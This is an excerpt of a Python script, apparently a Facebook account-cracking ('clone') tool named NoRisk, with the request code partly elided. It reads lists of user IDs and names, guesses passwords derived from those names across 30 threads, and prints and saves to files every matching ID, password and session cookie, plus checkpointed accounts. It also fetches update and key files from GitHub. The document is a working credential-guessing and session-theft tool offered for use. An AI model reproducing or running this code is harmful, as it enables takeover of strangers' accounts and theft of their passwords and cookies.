...
#--------------------< SYS >--------------------#
sys.stdout.write('\x1b]2; <[NoRisk]>\x07')
#--------------------< COLOUR >--------------------#
...
def NoRisk():
	...
	else:linex();print(f'{xd} OPTION NOT FOUND ');linex();time.sleep(1);print(f"{xd} TRY AGAIN");time.sleep(1);NoRisk()
#--------------------< FILE MENU >--------------------#
def ___file___():
	clear();print(f'{xd} EXAMPLE {xdxx} /sdcard/NoRisk.txt');linex();file=input(f"{xdx} ENTER FILE NAME {xdxx} ")
	try:
	...
	if cpx in ['y','Y','yes','Yes','1']:
		...
		pcp.append('n')
	with tred(max_workers=30) as __NoRisk__:
		...
		for user in fo:
			...
			passlist = plist
			if methd in ['1']:
				__NoRisk__.submit(___M1___,ids,names,passlist)
			elif methd in ['2']:
				__NoRisk__.submit(___M2___,ids,names,passlist)
			else:
				__NoRisk__.submit(___M1___,ids,names,passlist)
...
def ___M1___(ids,names,passlist):
		try:
				global loop,oks,cps
				sys.stdout.write(f'\r\r{G1}NoRisk{W}-{R}|{T}%s{R}|{W}-{R}|{G}%s{R}|{W}-{R}|{P}%s{R}| '%(loop,len(oks),len(cps)));sys.stdout.flush()
				fn = names.split(' ')[0]
				try:
						ln = names.split(' ')[1]
				except:
				...
				for pw in passlist:
						...
						if 'session_key' in po:
										...
										print(f'\r\r{R}<{W}={R}>{W}-{R}<{G}NoRisk-OK{R}>{G} '+ids+' | '+pas+'\033[1;97m')
										print(f'\r\r{R}<{W}={R}>{W}-{R}<{G}COOKIES{R}>{G} '+cookie);linex()
										open('/sdcard/NoRisk-FILE-M1-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
										oks.append(ids)
										break
						elif 'www.facebook.com' in po['error']['message']:
										if 'y' in pcp:
												print(f'\r\r{R}<{W}={R}>{W}-{R}<{P}NoRisk-CP{R}>{P} '+ids+' | '+pas+'\033[1;97m')
												open('/sdcard/NoRisk-FILE-M1-CP.txt','a').write(ids+'|'+pas+'\n')
												cps.append(ids)
												break
						else:continue
				loop+=1
...
def ___M2___(ids,names,passlist):
		try:
				global loop,oks,cps
				sys.stdout.write(f'\r\r{G1}NoRisk{R}{W}-{R}|{T}%s{R}|{W}-{R}|{G}%s{R}|{W}-{R}|{P}%s{R}| '%(loop,len(oks),len(cps)));sys.stdout.flush()
				fn = names.split(' ')[0]
				try:
						ln = names.split(' ')[1]
				except:
				...
				for pw in passlist:
						...
						if 'session_key' in po:
										...
										print(f'\r\r{R}<{W}={R}>{W}-{R}<{G}NoRisk-OK{R}>{G} '+ids+' | '+pas+'\033[1;97m')
										print(f'\r\r{R}<{W}={R}>{W}-{R}<{G}COOKIES{R}>{G} '+cookie);linex()
										open('/sdcard/NoRisk-FILE-M2-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
										oks.append(ids)
										break
						elif 'www.facebook.com' in po['error']['message']:
										if 'y' in pcp:
												print(f'\r\r{R}<{W}={R}>{W}-{R}<{P}NoRisk-CP{R}>{P} '+ids+' | '+pas+'\033[1;97m')
												open('/sdcard/NoRisk-FILE-M2-CP.txt','a').write(ids+'|'+pas+'\n')
												cps.append(ids)
												break
						else:continue
				loop+=1
...
try:
    os.system('clear')
    srv = requests.get('https://raw.githubusercontent.com/NoRisk24/BD-CLONE/refs/heads/main/Server.txt').text
    if "update" in srv:
        os.system('clear')
        count = 0
        for j in range(3000):
...
GITHUB_KEYS_URL = "https://raw.githubusercontent.com/NoRisk24/Old-Clone/refs/heads/main/NoRisk.txt"
